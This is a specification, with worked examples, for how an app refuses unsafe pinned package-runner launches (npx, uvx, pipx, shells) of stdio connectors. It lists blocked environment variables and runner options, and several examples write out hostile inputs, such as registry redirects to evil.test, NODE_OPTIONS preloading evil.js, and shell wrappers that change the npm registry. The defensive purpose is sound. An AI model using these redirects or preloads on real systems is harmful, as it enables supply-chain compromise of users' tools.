# app.package-runner-launch

- Status: active
- Since: 0.1.0
- Source: HAL-1132 (release check C93), the package-runner and environment rules of `ports.connector-trust-enforcement`; HAL-2134 (release check C188: an unpinned package runner starts once a person has trusted it); HAL-2527 (registry options, proxy, certificate and preload variables, found while writing the pinning contract suite); HAL-2559 (a pin behind a shell, options that move the folder, config, trust or proxy, variables that move the config home or program lookup, and `-p` running another program, found while reviewing HAL-2527; a pin on any program that isn't a package runner, and `pipx run --spec` running another program, found while reviewing HAL-2559); HAL-4094 (a command word that isn't the pin's package, and a package option after the command word, found in Liam's review of the pinned launcher; npm's shortened `--reg`, and only a few allowed options before the command word, found in its second review)

The app shall treat a stdio `command` as a package runner when its program name, without its folder, in any case and without a `.cmd`, `.exe`, `.bat` or `.ps1` ending, is `npx`, `bunx`, `uvx` or `pnpx`, or is one of `npm exec`, `npm x`, `pnpm dlx`, `yarn dlx`, `bun x`, `pipx run` and `uv tool run`, or when it is `cmd`, `sh`, `bash`, `zsh`, `powershell` or `pwsh` and any word of its arguments, split on spaces, quotes and `;`, `&`, `|`, `(`, `)`, starts a package runner. It shall refuse a `pin` whose version isn't one exact version as `app.connector-pin-version` defines it, and a transport with a `pin` whose `env` sets or whose `inheritEnv` names (HAL-6266), in any case, `NODE_OPTIONS`, `NODE_PATH`, `PYTHONPATH`, `PYTHONSTARTUP`, `PYTHONHOME`, or a name starting with `npm_config_`, `YARN_`, `PNPM_`, `BUN_`, `COREPACK_`, `UV_`, `PIP_` or `PIPX_`; or a proxy, `HTTPS_PROXY`, `HTTP_PROXY` or `ALL_PROXY`; or a certificate setting, `NODE_EXTRA_CA_CERTS`, `NODE_TLS_REJECT_UNAUTHORIZED`, `SSL_CERT_FILE`, `SSL_CERT_DIR`, `REQUESTS_CA_BUNDLE` or `CURL_CA_BUNDLE`; or a preload, `LD_PRELOAD`, `LD_LIBRARY_PATH`, `DYLD_INSERT_LIBRARIES` or `DYLD_LIBRARY_PATH`; or a config home or program lookup, `HOME`, `USERPROFILE`, `APPDATA`, `LOCALAPPDATA`, `XDG_CONFIG_HOME`, `XDG_CACHE_HOME`, `PATH`, `PATHEXT` or `COMSPEC`. Each of these five groups gives its own reason. It shall refuse a transport with a `pin` whose program is `cmd`, `sh`, `bash`, `zsh`, `powershell` or `pwsh`, whatever its arguments, because a shell can change the registry, config or package before the runner starts, so a pin can't be checked. It shall also refuse a transport with a `pin` whose command isn't a package runner, such as `env`, `node`, `wsl` or a shell not named here, because a pin only means something to a package runner and such a program could start one with any registry or config. A package runner without a `pin` passes this check: like every stdio program it starts only with a trust grant, and its command and args are in the fingerprint the person confirmed. The trust check marks it as not pinned with the same detection (build plan item 10c), so the two can't disagree.

For a pinned `npx`, `pnpx`, `npm` or `pnpm` runner, the app shall refuse the launch when a word is `-c`, or in any case `--call` or `--shell-mode`, or starts with one of them and `=`, because these run a shell command, with the shell's reason. For a pinned package runner, the app shall refuse the launch when any word, in any case, is or starts with `<option>=` for one of the options that fetch from somewhere other than the pin's registry: `--registry`, npm's shortened `--reg`, an npm scope's `--@<scope>:registry`, pnpm's `--config.<key>`, `--userconfig`, `--globalconfig`, `--cache`, `--index-url`, `-i`, `--extra-index-url`, `--index`, `--default-index`, `--find-links`, `-f`, `--config-file`, `--cache-dir` and `--pip-args`; the folder options `--prefix`, `-C`, `--dir`, `--cwd`, `--directory` and `--project`; the file options `--with-requirements`, `--with-editable`, `--constraints` (`-c`) and `--overrides`; the trust options `--trusted-host`, `--allow-insecure-host`, `--cafile`, `--ca`, `--cert` and `--strict-ssl`; and `--proxy`, `--https-proxy` and `--node-options`. A word after the package counts too, because the check can't tell where the runner's options end. Otherwise it shall read the package each word names: the value of `-p`, `--package`, `--from`, `--with` (split on commas) or `--spec`, and any other word that starts with the pin's package name. It shall refuse the launch when no word names the pin's package, when a named package isn't the pin's (PyPI names compared the way PyPI compares them), and when a named version isn't the pin's version or isn't one exact version as `app.connector-pin-spec` reads it. The pin's package without a version passes, because the launcher adds the pin. For PyPI, `name@1.2.3` is read as `name==1.2.3`, the form `uvx` also accepts. The runner's command word is the first word after its subcommand that doesn't start with `-` and isn't a package option's value, or the word right after a `--`; the words before it are the runner's own options, and the words after it are passed on. Only a package option among the runner's own options counts as one for the packages it names. When such an option is `-p`, `--package`, `--from`, `--with` or `--spec`, or starts with one of them and `=`, the runner starts its command word as a program, and the app shall refuse the launch when there is no command word, or when it isn't the pin's package name or that name without its npm scope (`mail-mcp` for `@acme/mail-mcp`). Without such an option, the command word is the package the runner fetches, and the app shall refuse the launch when it doesn't name the pin's package. The app shall refuse the launch when a word after the command word, before a `--`, is a package option, because `npm exec` reads it as its own option while `npx` and `uvx` pass it on, so a pin can't say which package starts. `app.pinned-runner-args` reads the words the same way. Otherwise the app shall refuse the launch when a word before the command word isn't the runner's subcommand, a `--`, a package option's value, or, compared as written before any `=`, one of the options the runner's program may set with a pin: `-y`, `--yes`, `-q`, `--quiet`, `--silent`, `-p` and `--package` for `npx` and `npm`; `-s`, `--silent` and `--package` for `pnpx` and `pnpm`; `-q`, `--quiet`, `-p` and `--package` for `yarn`; `--bun`, `-p` and `--package` for `bunx` and `bun`; `-q`, `--quiet`, `--isolated`, `--from` and `--with` for `uvx` and `uv`; and `-q`, `--quiet` and `--spec` for `pipx`. For `npm`, which reads its own options after the command word too, it shall refuse the launch when a word after the command word, before a `--`, starts with `-` and isn't one of these. npm, pnpm and pipx read a shortened long option, such as `--regis` for `--registry`, which a list of refused options can't hold.

`npm x`, `bun x` and `pnpx` are aliases the tools document, so they count too. A subcommand counts wherever it appears in the arguments, so an option before it doesn't hide it. A shell counts even when the runner name is only text it prints, such as `echo npx`; that errs to the safe side. An option that takes its own value before the command word, such as `uvx --python 3.12 --from mail-mcp mail-mcp`, makes that value look like the command word and is refused with a pin; that errs to the safe side too, and the connector still starts unpinned.

## Examples

- Given a stdio transport with `command: "NPX.CMD"`, `args: ["-y", "@acme/mail-mcp"]` and no `pin`,
  when it is checked,
  then it passes without a pin, and `isPackageRunner` is still true for it.
- Given the command `C:/tools/uvx.exe`, `bunx`, `pnpx`, `npm` with `--yes exec`, `npm` with `x`, `pnpm dlx`, `yarn dlx`, `bun x`, `pipx run` or `uv tool run`,
  when it is checked,
  then it is a package runner.
- Given the command `cmd` with `/c`, `npx`, `-y`, `@acme/mail-mcp`, or `sh` with `-c` and `exec uvx mail-mcp`, or `powershell` with `-Command` and `& 'npx.cmd' -y @acme/mail-mcp`, and no `pin`,
  when it is checked,
  then it is a package runner and passes without a pin.
- Given the command `node` with `server.js`, `python` with `-m mail_mcp`, `npm` with `start`, or `uv` with `run server.py`,
  when it is checked without a pin,
  then it isn't a package runner and passes.
- Given a pinned stdio transport whose `pin.version` is `latest` or `^2.3.1`,
  when it is checked,
  then it is refused.
- Given a pinned stdio transport whose `env` sets `node_options` to `--require ./evil.js` or `NPM_CONFIG_REGISTRY` to another address,
  when it is checked,
  then it is refused.
- Given a stdio transport pinned to `@acme/mail-mcp` at `2.3.1` whose `args` are `-y` and `@acme/mail-mcp@3.0.0`, or `-y` and `@acme/mail-mcp@latest`,
  when it is checked,
  then it is refused because the command names another version.
- Given a stdio transport pinned to `@acme/mail-mcp` at `2.3.1` whose `args` are `-p`, `other-pkg` and `mail-mcp`, or `-y` and `other-pkg`,
  when it is checked,
  then it is refused because the command names another package, or doesn't name the pinned one.
- Given a stdio transport pinned to `mail-mcp` at `2.3.1` with `command: "uvx"` and `args` of `Mail_MCP`, `mail-mcp==2.3.1`, `mail-mcp@2.3.1`, or `--from`, `mail-mcp==2.3.1` and `mail-mcp`,
  when it is checked,
  then it passes with the pin.
- Given a pinned stdio transport whose `env` sets `HTTPS_PROXY`, `all_proxy`, `NODE_EXTRA_CA_CERTS`, `REQUESTS_CA_BUNDLE`, `LD_PRELOAD` or `DYLD_INSERT_LIBRARIES`,
  when it is checked,
  then it is refused, with a reason for a proxy, a certificate or a preload.
- Given a stdio transport pinned to `@acme/mail-mcp` at `2.3.1` with `command: "npx"` and `args` of `--registry=https://evil.test`, `-y` and `@acme/mail-mcp`, or `--userconfig` and `./evil.npmrc` before the package, or `uvx` with `--index-url`, `--extra-index-url`, `--default-index` or `--find-links` before it,
  when it is checked,
  then it is refused because the command could fetch the package from another place.
- Given a stdio transport pinned to `@acme/mail-mcp` at `2.3.1` with `command: "sh"` and `args` of `-c` and `NPM_CONFIG_REGISTRY=https://evil.test npx -y @acme/mail-mcp`, or `bash` with `-c` and `npm config set registry https://evil.test; npx -y @acme/mail-mcp`, or `cmd` with `/c` and `npx --registry=https://evil.test -y @acme/mail-mcp`, or `powershell` with `-Command` and `node server.js`,
  when it is checked,
  then it is refused because a pin behind a shell can't be checked.
- Given a stdio transport pinned to `@acme/mail-mcp` at `2.3.1` with `command: "env"` and `args` of `NPM_CONFIG_REGISTRY=https://evil.test`, `npx`, `-y` and `@acme/mail-mcp`, or `dash`, `fish` or `ksh` with `-c` and `npx -y @acme/mail-mcp`, or `busybox` with `sh`, `-c` and `npx -y @acme/mail-mcp`, or `wsl` with `npx`, `-y` and `@acme/mail-mcp`, or `node` with `evil.js`,
  when it is checked,
  then it is refused because the command isn't a package runner, so a pin can't be checked.
- Given a stdio transport pinned to `@acme/mail-mcp` at `2.3.1` with `command: "npx"` and `args` of `-p`, `@acme/mail-mcp`, `-c` and `mail-mcp`, or `npm` with `exec`, `--package=@acme/mail-mcp` and `--call=mail-mcp`, or `pnpm` with `--shell-mode`, `dlx` and `@acme/mail-mcp`,
  when it is checked,
  then it is refused because the command runs a shell command.
- Given a stdio transport pinned to `@acme/mail-mcp` at `2.3.1` with `command: "npx"` and `args` that set `--prefix ./evil`, `-C ./evil`, `--proxy`, `--https-proxy`, `--cafile`, `--strict-ssl=false` or `--node-options` before the package, or `pnpm` with `--dir=./evil` or `--config.registry=https://evil.test`, or `yarn` with `--cwd`, or `uvx` with `--directory`, `--project`, `--with-requirements`, `--with-editable`, `-c` or `--allow-insecure-host`, or `pipx run` with `--trusted-host`,
  when it is checked,
  then it is refused because the command could fetch the package from another place.
- Given a pinned stdio transport whose `env` sets `HOME`, `UserProfile`, `APPDATA`, `LOCALAPPDATA`, `xdg_config_home`, `XDG_CACHE_HOME`, `PATH`, `PATHEXT` or `COMSPEC`,
  when it is checked,
  then it is refused, with the reason that the runner could read another config, cache or program.
- Given a stdio transport pinned to `@acme/mail-mcp` at `2.3.1` with `command: "npx"` and `args` of `-y`, `-p`, `@acme/mail-mcp@2.3.1`, `sh` and `./evil.sh`, or `--package=@acme/mail-mcp` alone, or `npm` with `exec`, `--package`, `@acme/mail-mcp`, `--`, `node` and `evil.js`, or a transport pinned to `mail-mcp` with `uvx` and `--from`, `mail-mcp==2.3.1`, `python` and `./evil.py`, or `--with`, `mail-mcp` and `other-tool`, or `pipx` with `run`, `--spec`, `mail-mcp==2.3.1`, `python` and `./evil.py`,
  when it is checked,
  then it is refused because the command runs another program than the pinned package's, or names none.
- Given a stdio transport pinned to `@acme/mail-mcp` at `2.3.1` with `command: "npx"` and `args` of `-y`, `-p`, `@acme/mail-mcp@2.3.1` and `@acme/mail-mcp`, or `npm` with `--yes`, `exec`, `--package=@acme/mail-mcp@2.3.1`, `--`, `mail-mcp`, `--inbox` and `work`, or a transport pinned to `mail-mcp` with `pipx` and `run`, `--spec`, `mail-mcp==2.3.1` and `mail-mcp`,
  when it is checked,
  then it passes with the pin.
- Given a stdio transport pinned to `@acme/mail-mcp` at `2.3.1` with `command: "npx"` and `args` of `-y`, `other-pkg` and `@acme/mail-mcp`, or a transport pinned to `mail-mcp` with `uvx` and `other-tool` and `mail-mcp`,
  when it is checked,
  then it is refused because the command word isn't the pinned package.
- Given a stdio transport pinned to `@acme/mail-mcp` at `2.3.1` with `command: "npx"` and `args` of `-y`, `@acme/mail-mcp`, `-p` and `@acme/mail-mcp`, or `npm` with `exec`, `@acme/mail-mcp`, `--package` and `@acme/mail-mcp`, or a transport pinned to `mail-mcp` with `uvx` and `mail-mcp`, `--from` and `mail-mcp`,
  when it is checked,
  then it is refused because a package option after the command word means a pin can't be checked.
- Given a stdio transport pinned to `@acme/mail-mcp` at `2.3.1` with `command: "npx"` and `args` of `-y`, `--`, `@acme/mail-mcp`, `-p` and `work`,
  when it is checked,
  then it passes with the pin, because the words after `--` are the server's own.
- Given a stdio transport pinned to `@acme/mail-mcp` at `2.3.1` with `command: "npx"` and `args` of `-y`, `--reg=http://evil.test/` and `@acme/mail-mcp`, or `npm` with `exec`, `@acme/mail-mcp`, `--reg` and `http://evil.test/`,
  when it is checked,
  then it is refused because the command could fetch the package from another place.
- Given a stdio transport pinned to `@acme/mail-mcp` at `2.3.1` with `command: "npx"` and `args` of `-y`, `--regis=http://evil.test/` and `@acme/mail-mcp`, or `--YES` or `-yq` before the package, or `npm` with `--loglevel=silly`, `exec` and `@acme/mail-mcp`, or `npm` with `exec`, `@acme/mail-mcp` and `--regis=http://evil.test/`, or a transport pinned to `mail-mcp` with `pipx` and `run`, `--ind=http://evil.test/` and `mail-mcp`,
  when it is checked,
  then it is refused because a pinned runner may only set a few options.
- Given a stdio transport pinned to `@acme/mail-mcp` at `2.3.1` with `command: "npx"` and `args` of `-y`, `@acme/mail-mcp`, `--regis=work`, `--inbox` and `work`, or `npm` with `exec`, `--yes`, `@acme/mail-mcp`, `--`, `--inbox` and `work`,
  when it is checked,
  then it passes with the pin, because those words are the server's own.
- Given a pinned stdio transport for `@acme/mail-mcp` at `2.3.1` whose `env` sets only `MAIL_ACCOUNT`,
  when it is checked,
  then it passes with the pin.
- Given a pinned stdio transport whose `inheritEnv` names `npm_config_registry` or `HTTPS_PROXY`,
  when it is checked,
  then it is refused with the same reason as when its `env` sets it; with only `AWS_PROFILE` it passes.
